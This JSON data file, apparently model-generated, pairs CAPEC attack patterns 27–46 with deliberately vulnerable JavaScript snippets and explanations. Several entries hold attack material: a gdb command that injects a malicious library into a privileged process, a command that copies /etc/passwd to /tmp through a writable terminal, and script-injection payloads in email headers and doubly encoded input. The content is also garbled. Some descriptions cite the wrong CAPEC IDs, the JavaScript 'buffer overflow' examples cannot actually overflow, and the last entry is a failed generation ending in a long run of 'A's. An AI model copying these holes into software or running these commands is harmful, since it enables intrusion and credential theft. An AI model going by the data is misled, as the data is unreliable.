        "description": "This JavaScript code snippet demonstrates a race condition vulnerability. The code first checks if a file exists and then reads its content. After a delay, it writes new content to the file. The vulnerability arises because there is a window of time between the file existence check and the file write operation. An attacker could exploit this window to replace the file with a malicious one, leading to unintended behavior. This example embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and related CWEs such as CWE-363 (Race Condition Enabling Link Following) and CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "const fs = require('fs');\nconst path = '/tmp/sensitive_file';\n\n// Check if the file exists\nif (!fs.existsSync(path)) {\n  // Simulate a delay to create a race condition window\n  setTimeout(() => {\n    // Create a temporary file\n    fs.writeFileSync(path, 'Temporary data');\n  }, 1000);\n} else {\n  console.log('File already exists');\n}",
        "description": "This JavaScript code snippet demonstrates a race condition vulnerability involving symbolic links. The code first checks if a file at '/tmp/sensitive_file' exists. If it does not, it waits for one second before creating the file and writing 'Temporary data' to it. During this delay, an attacker could create a symbolic link at '/tmp/sensitive_file' pointing to a sensitive file. When the code executes the write operation, it would inadvertently write to the sensitive file instead of the intended temporary file. This embodies the main idea of the CAPEC by illustrating how an attacker can exploit a time-of-check time-of-use (TOCTOU) race condition to manipulate file operations via symbolic links."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let input = req.url.split('?')[1];\n  try {\n    // CWE-20: Improper Input Validation\n    if (!input || input.length > 100) {\n      throw new Error('Invalid input');\n    }\n    // CWE-74: Improper Neutralization of Special Elements\n    let sanitizedInput = input.replace(/[^a-zA-Z0-9]/g, '');\n    // CWE-209: Generation of Error Message Containing Sensitive Information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Processed input: ${sanitizedInput}`);\n  } catch (err) {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Error: ${err.message}`);\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that processes user input from the URL query string. The code demonstrates several common vulnerabilities: \n1. CWE-20 (Improper Input Validation): The input is checked for length but not for other potentially harmful properties.\n2. CWE-74 (Improper Neutralization of Special Elements): The input is sanitized by removing non-alphanumeric characters, but this simplistic approach may not cover all edge cases.\n3. CWE-209 (Generation of Error Message Containing Sensitive Information): Error messages are generated and sent back to the client, potentially exposing sensitive information.\n\nThe code embodies the main idea of the CAPEC by showing how an attacker could use fuzzing to discover weaknesses in input validation and sanitization, leading to potential exploitation."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "const fs = require('fs');\nconst filePath = '/tmp/sensitive_file';\n\n// Time-of-check\nif (fs.existsSync(filePath)) {\n  // Simulate a delay to create a window for race condition\n  setTimeout(() => {\n    // Time-of-use\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) throw err;\n      console.log('File content:', data);\n    });\n  }, 1000); // 1 second delay\n}",
        "description": "This JavaScript code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition. The code first checks if a file exists at a specified path (`/tmp/sensitive_file`). If the file exists, it introduces a delay using `setTimeout` to simulate a window where an attacker could potentially replace or modify the file. After the delay, the code reads the file's content. This gap between the check and the use of the file creates a vulnerability where the file's state could change, leading to unexpected behavior. This example embodies the main idea of CAPEC-367 and related CWEs, highlighting the risks of race conditions and improper synchronization."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction hijackThread(pid) {\n  // CWE-114: Load a potentially malicious library\n  const maliciousLibrary = './maliciousLibrary.so';\n  exec(`gdb -p ${pid} -ex \"call dlopen('${maliciousLibrary}', 1)\" -ex detach -ex quit`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage: hijack a privileged process with PID 1234\nhijackThread(1234);",
        "description": "This JavaScript code snippet demonstrates the concept of 'Hijacking a Privileged Thread of Execution' by injecting a malicious library into a running process. The function `hijackThread` takes a process ID (PID) as an argument and uses the `exec` function from Node.js's `child_process` module to run a GDB command. This command attaches to the specified process, loads a potentially malicious library (`maliciousLibrary.so`), and then detaches. This embodies CWE-114 (Process Control) by loading a library from an untrusted source. The code snippet represents the main idea of the CAPEC by showing how an adversary could hijack a privileged thread to execute malicious code within an existing process, potentially evading detection and gaining elevated privileges."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const { username, password } = req.query;\n  if (username === 'admin' && password === 'password') {\n    res.cookie('session', 'admin-session', { httpOnly: false, secure: false }); // CWE-315, CWE-539\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  const session = req.cookies.session;\n  if (session === 'admin-session') { // CWE-565, CWE-302\n    res.send('Welcome to the admin dashboard');\n  } else {\n    res.send('Access denied');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js application that handles user login and access to a dashboard using cookies. The code contains several vulnerabilities related to the CAPEC description and associated CWEs:\n\n1. **CWE-315 (Cleartext Storage of Sensitive Information in a Cookie)**: The session cookie is stored in cleartext without encryption.\n2. **CWE-539 (Use of Persistent Cookies Containing Sensitive Information)**: The session cookie contains sensitive information and is not marked as secure or HTTP-only.\n3. **CWE-565 (Reliance on Cookies without Validation and Integrity Checking)**: The application relies on the session cookie without validating its integrity.\n4. **CWE-302 (Authentication Bypass by Assumed-Immutable Data)**: The session cookie value is assumed to be immutable and trusted without proper validation.\n\nThe code represents the main idea of the CAPEC by showing how an attacker could access, intercept, or modify HTTP cookies to gain unauthorized access to sensitive information or functionalities."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  // Vulnerable code: directly using user input in HTML without proper sanitization\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body><h1>User Input: ${userInput}</h1></body></html>`);\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server parses the query string from the URL and directly embeds the user input into the HTML response without any sanitization or escaping. This represents the main idea of the CAPEC 'XSS Through HTTP Query Strings' by demonstrating how an adversary can inject malicious script code through the query string. The related CWEs are exemplified by the lack of proper neutralization (CWE-80, CWE-79), the use of GET request method (CWE-598), and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    // Simulate forwarding the request to a backend server\n    const options = {\n      hostname: 'backend-server.com',\n      port: 80,\n      path: '/',\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'Content-Length': Buffer.byteLength(body)\n      }\n    };\n\n    const proxyReq = http.request(options, proxyRes => {\n      let proxyBody = '';\n      proxyRes.on('data', chunk => {\n        proxyBody += chunk.toString();\n      });\n      proxyRes.on('end', () => {\n        res.writeHead(proxyRes.statusCode, proxyRes.headers);\n        res.end(proxyBody);\n      });\n    });\n\n    proxyReq.on('error', err => {\n      res.writeHead(500);\n      res.end('Error: ' + err.message);\n    });\n\n    // Forward the original request body\n    proxyReq.write(body);\n    proxyReq.end();\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests and forwards them to a backend server. The code demonstrates the concept of HTTP Request Smuggling by not properly handling the incoming request body and headers, potentially allowing an attacker to craft malicious requests that can be interpreted differently by the intermediary server and the backend server. This can lead to various attacks such as unauthorized access or data leakage. The code also touches on related CWEs like improper neutralization of CRLF sequences (CWE-113) and inconsistent interpretation of HTTP requests (CWE-444)."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.url.split('?')[1]; // Assume user input is taken from URL query string\n  if (userInput) {\n    // Vulnerable to HTTP Response Splitting\n    res.setHeader('Content-Type', 'text/html');\n    res.setHeader('Set-Cookie', 'sessionId=abc123; Path=/; HttpOnly');\n    res.writeHead(200);\n    res.end(`Hello, ${userInput}`);\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end('Hello, World!');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server takes user input from the URL query string and includes it in the HTTP response without proper neutralization of special characters. This makes the server vulnerable to HTTP Response Splitting attacks (CWE-113). An attacker could inject CRLF sequences into the user input to manipulate the HTTP response headers, potentially leading to security issues such as session fixation or cross-site scripting (XSS). The code demonstrates the main idea of CAPEC-34 by showing how improper handling of user input can lead to malicious content injection in HTTP responses."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "const fs = require('fs');\nconst configFilePath = 'config.json';\n\n// Read configuration file\nfs.readFile(configFilePath, 'utf8', (err, data) => {\n  if (err) throw err;\n  \n  // Parse configuration file\n  let config;\n  try {\n    config = JSON.parse(data);\n  } catch (e) {\n    throw new Error('Invalid JSON format');\n  }\n  \n  // Execute code based on configuration\n  if (config.execute) {\n    eval(config.execute); // CWE-95: Eval Injection\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can leverage executable code in a non-executable file, specifically a configuration file. The code reads a JSON configuration file and parses it. If the configuration contains an 'execute' field, the code within this field is executed using the 'eval' function. This represents CWE-95 (Eval Injection), where user-controllable input is not properly neutralized before being used in a dynamic evaluation call. This snippet embodies the main idea of CAPEC-153 by showing how an attacker can exploit a system's trust in configuration files to execute malicious code."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Unpublished endpoint\napp.get('/admin/secret', (req, res) => {\n  // Missing authentication and authorization checks\n  res.send('This is a secret admin functionality.');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with an unpublished endpoint '/admin/secret'. The endpoint lacks both authentication and authorization checks, allowing any user to access it. This embodies the main idea of the CAPEC 'Using Unpublished Interfaces or Functionality' by exposing functionality that was not intended to be publicly available. The related CWEs are represented as follows: CWE-306 (Missing Authentication for Critical Function) and CWE-862 (Missing Authorization) are demonstrated by the absence of any checks before granting access to the secret functionality. This snippet highlights the potential security risk of having undocumented and unprotected endpoints in a web application."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "const fs = require('fs');\n\n// Storing sensitive information in cleartext\nconst sensitiveData = 'user_password=supersecretpassword';\nfs.writeFileSync('config.txt', sensitiveData);\n\n// Reading the sensitive information without encryption\nconst data = fs.readFileSync('config.txt', 'utf8');\nconsole.log('Sensitive Data:', data);\n\n// Improperly clearing sensitive data\nfs.writeFileSync('config.txt', '');\n\n// Sensitive data still recoverable\nconst recoveredData = fs.readFileSync('config.txt', 'utf8');\nconsole.log('Recovered Data:', recoveredData);",
        "description": "This JavaScript code snippet demonstrates the vulnerability of storing sensitive information in cleartext and the improper handling of sensitive data. The code writes a sensitive password to a file in cleartext, reads it back without encryption, and then attempts to clear the sensitive data by writing an empty string to the file. However, this approach does not securely erase the data, making it potentially recoverable. This example embodies the main idea of CAPEC- Retrieve Embedded Sensitive Data, highlighting related CWEs such as CWE-312 (Cleartext Storage of Sensitive Information) and CWE-226 (Sensitive Information in Resource Not Removed Before Reuse)."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Vulnerable: External control of file path\nconst userProvidedPath = process.argv[2];\n\n// Vulnerable: Untrusted search path\nconst configFilePath = path.join(userProvidedPath, 'config.json');\n\n// Vulnerable: Reading configuration file from an untrusted path\nfs.readFile(configFilePath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading config file:', err);\n    return;\n  }\n  try {\n    const config = JSON.parse(data);\n    console.log('Configuration loaded:', config);\n  } catch (parseErr) {\n    console.error('Error parsing config file:', parseErr);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can manipulate the search path for a configuration file. The code takes a user-provided path as an argument and constructs the path to a configuration file ('config.json') using this input. This embodies the CAPEC idea of 'Leveraging/Manipulating Configuration File Search Paths' by allowing an attacker to control the path to a critical resource. The related CWEs are represented as follows: CWE-426 (Untrusted Search Path) and CWE-73 (External Control of File Name or Path) are demonstrated by using an externally supplied path to locate the configuration file. CWE-427 (Uncontrolled Search Path Element) is shown by the potential for unintended actors to control the search path. CWE-99 (Improper Control of Resource Identifiers) is illustrated by the lack of restrictions on the input used to identify the configuration file."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const user = req.query.user;\n  // Assume user authentication is done here\n  res.cookie('authToken', Buffer.from(user).toString('base64'), { httpOnly: true });\n  res.send('Logged in');\n});\n\napp.get('/profile', (req, res) => {\n  const authToken = req.cookies.authToken;\n  if (!authToken) {\n    return res.status(401).send('Unauthorized');\n  }\n  const user = Buffer.from(authToken, 'base64').toString('ascii');\n  // No integrity check on the authToken\n  res.send(`Welcome ${user}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web application that demonstrates the vulnerability described in the CAPEC. The application has two routes: '/login' and '/profile'. When a user logs in via the '/login' route, an authentication token is created by encoding the username in base64 and storing it in a cookie. The '/profile' route retrieves this token from the cookie and decodes it to get the username. However, the code does not perform any integrity checks on the token, making it susceptible to manipulation. An attacker could modify the 'authToken' cookie to impersonate another user. This snippet embodies the main idea of the CAPEC by showing how client-side tokens can be manipulated due to the lack of integrity checks and proper validation, as highlighted by the related CWEs."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "const fs = require('fs');\nconst net = require('net');\n\nconst terminalDevice = '/dev/pts/1'; // Target terminal device\nconst maliciousCommand = 'cat /etc/passwd > /tmp/stolen_passwd\\n';\n\n// Check if the terminal device is writable\nfs.access(terminalDevice, fs.constants.W_OK, (err) => {\n  if (!err) {\n    // Send the malicious command to the terminal device\n    fs.writeFile(terminalDevice, maliciousCommand, (err) => {\n      if (err) throw err;\n      console.log('Malicious command sent to terminal device');\n    });\n  } else {\n    console.log('Terminal device is not writable');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates an attack that exploits a writable terminal device. The code checks if a specified terminal device (e.g., /dev/pts/1) is writable. If it is, the code writes a malicious command to the terminal device. The malicious command attempts to copy the contents of /etc/passwd to a temporary file (/tmp/stolen_passwd). This attack relies on the assumption that the target user will execute the command, thereby exposing sensitive information. The code embodies the main idea of CAPEC-62 (Manipulating Writeable Terminal Devices) and highlights related weaknesses such as command injection (CWE-77, CWE-78), exposure of sensitive information (CWE-214), and improper access control (CWE-529)."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "const emailHeaders = {\n  'From': 'attacker@example.com',\n  'To': 'victim@example.com',\n  'Subject': 'Important Update',\n  'X-Custom-Header': 'normalValue\\nContent-Type: text/html\\n\\n<script>alert(\"XSS Attack!\");</script>'\n};\n\nfunction sendEmail(headers) {\n  for (const header in headers) {\n    if (headers.hasOwnProperty(header)) {\n      console.log(`${header}: ${headers[header]}`);\n    }\n  }\n  // Simulate sending email\n  console.log('Email sent!');\n}\n\nsendEmail(emailHeaders);",
        "description": "This JavaScript code snippet demonstrates how an attacker can inject malicious payloads into email headers by leveraging meta-characters. The 'X-Custom-Header' contains a newline character followed by a malicious script, which could be executed by an email client that improperly handles or neutralizes such input. This example embodies the CAPEC concept of using meta-characters in email headers to inject malicious payloads. The related CWEs are represented by the improper neutralization of escape sequences (CWE-150), improper encoding or escaping of output (CWE-116), and improper neutralization of HTTP headers for scripting syntax (CWE-644). The code highlights the potential vulnerability in email applications that do not correctly handle or sanitize email header inputs."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "function convertToMIME(input) {\n  const buffer = new ArrayBuffer(256); // Fixed buffer size\n  const view = new Uint8Array(buffer);\n  for (let i = 0; i < input.length; i++) {\n    view[i] = input.charCodeAt(i); // No bounds checking\n  }\n  return buffer;\n}\n\n// Example usage\nconst userInput = 'A'.repeat(300); // Input larger than buffer size\nconst mimeData = convertToMIME(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable MIME conversion routine. The function `convertToMIME` takes an input string and attempts to convert it to a MIME-compatible format by copying its characters into a fixed-size buffer. However, it does not perform any bounds checking to ensure that the input fits within the buffer, leading to a classic buffer overflow vulnerability (CWE-120). This can cause the program to write outside the intended memory bounds (CWE-119), potentially allowing an attacker to execute arbitrary code. The example usage shows how an attacker could exploit this vulnerability by providing an input string that exceeds the buffer size, causing a buffer overflow."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "function processInput(input) {\n  // First parser layer: decode HTML entities\n  let parser1 = input.replace(/&lt;/g, '<').replace(/&gt;/g, '>');\n  \n  // Input validation layer: check for script tags\n  if (parser1.includes('<script>')) {\n    throw new Error('Invalid input: script tags are not allowed');\n  }\n  \n  // Second parser layer: further decode URL encoding\n  let parser2 = decodeURIComponent(parser1);\n  \n  // Process the input (e.g., execute a command)\n  console.log('Processing input:', parser2);\n}\n\n// Example of an attack input\ntry {\n  processInput('%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B');\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates the concept of 'Exploiting Multiple Input Interpretation Layers' (CAPEC). The function `processInput` takes an input string and processes it through multiple layers. The first layer decodes HTML entities, the second layer performs input validation to check for script tags, and the third layer decodes URL encoding. The input validation is bypassed because it occurs before the second parser layer, allowing an attacker to disguise malicious input using multiple encoding layers. The example input '%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B' passes the validation but is ultimately decoded into a script tag, demonstrating the vulnerability."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "function loadImage(file) {\n  const reader = new FileReader();\n  reader.onload = function(event) {\n    const buffer = new ArrayBuffer(1024); // Fixed buffer size\n    const view = new Uint8Array(buffer);\n    const data = new Uint8Array(event.target.result);\n    for (let i = 0; i < data.length; i++) {\n      view[i] = data[i]; // No bounds checking\n    }\n    // Process the image data\n    processImage(view);\n  };\n  reader.readAsArrayBuffer(file);\n}\n\nfunction processImage(data) {\n  // Dummy function to simulate image processing\n  console.log('Processing image data:', data);\n}\n\n// Simulate file input\nconst fileInput = document.createElement('input');\nfileInput.type = 'file';\nfileInput.onchange = function(event) {\n  const file = event.target.files[0];\n  if (file && file.name.endsWith('.jpg')) { // Relying on file extension\n    loadImage(file);\n  }\n};\ndocument.body.appendChild(fileInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable image loading function that embodies the main idea of the CAPEC 'Overflow Binary Resource File'. The function 'loadImage' reads an image file using FileReader and attempts to copy its data into a fixed-size buffer without checking if the data fits within the buffer, leading to a potential buffer overflow (CWE-120, CWE-119). Additionally, the code relies on the file extension to determine if the file is an image (CWE-646), which can be exploited by an attacker to upload a malicious file disguised as a JPEG. The 'processImage' function is a placeholder to simulate further processing of the image data."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction readSymbolicLink(filePath) {\n  try {\n    const resolvedPath = fs.readlinkSync(filePath);\n    const buffer = Buffer.alloc(256);\n    const data = fs.readFileSync(resolvedPath);\n    data.copy(buffer);\n    console.log('Data:', buffer.toString());\n  } catch (err) {\n    console.error('Error:', err);\n  }\n}\n\nconst symlinkPath = path.join(__dirname, 'symlink');\nreadSymbolicLink(symlinkPath);",
        "description": "This JavaScript code snippet demonstrates a potential buffer overflow vulnerability via symbolic links. The `readSymbolicLink` function reads the target of a symbolic link and attempts to copy its contents into a fixed-size buffer without proper bounds checking. This can lead to a buffer overflow if the data exceeds the buffer size. The code embodies CWE-120 (Classic Buffer Overflow) by not verifying the size of the input before copying it to the buffer. It also touches on CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer) by potentially reading or writing outside the intended buffer boundaries. The symbolic link manipulation represents the core idea of the CAPEC attack."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Failed to parse CodeSnippet from completion {\"code_snippet\": \"const configData = '<config><tag>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA